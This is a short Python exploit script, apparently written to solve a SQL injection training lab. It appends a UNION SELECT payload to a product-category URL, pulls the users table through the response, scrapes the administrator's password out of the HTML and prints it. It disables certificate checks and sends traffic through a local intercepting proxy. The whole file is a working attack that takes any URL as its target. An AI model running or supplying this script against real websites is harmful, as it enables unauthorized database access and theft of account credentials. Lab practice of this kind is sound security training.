import requests
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from bs4 import BeautifulSoup

proxies = {'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080' }

def exploit_sqli(url):
    username ='administrator'
    path='/filter?category=Pets'
    sql_payload ="' UNION SELECT username, password FROM users--"
    r= requests.get(url+path+sql_payload, verify=False, proxies=proxies)
    res = r.text
    if "administrator" in res:
        print("[+] Admin parolası arıyorum")
        soup = BeautifulSoup(r.text, 'html.parser')
        admin_password= soup.find(string="administrator").find_next('td').get_text(strip=True)
        print("[+] Admin  Pass : '%s' " % admin_password)
        return True
    return False



if __name__ == "__main__":
    try:
        url =sys.argv[1].strip()
    except IndexError:
        print("[-] Usage:  %s <url> <payload>"% sys.argv[0])
        print('[-] For Example :  %s www.random.com ' % sys.argv[0])
        sys.exit(-1)
        
    print("[+] password Dumping")
    if not exploit_sqli(url):
        print("[+] SQL INJECTION bulunamadı")
  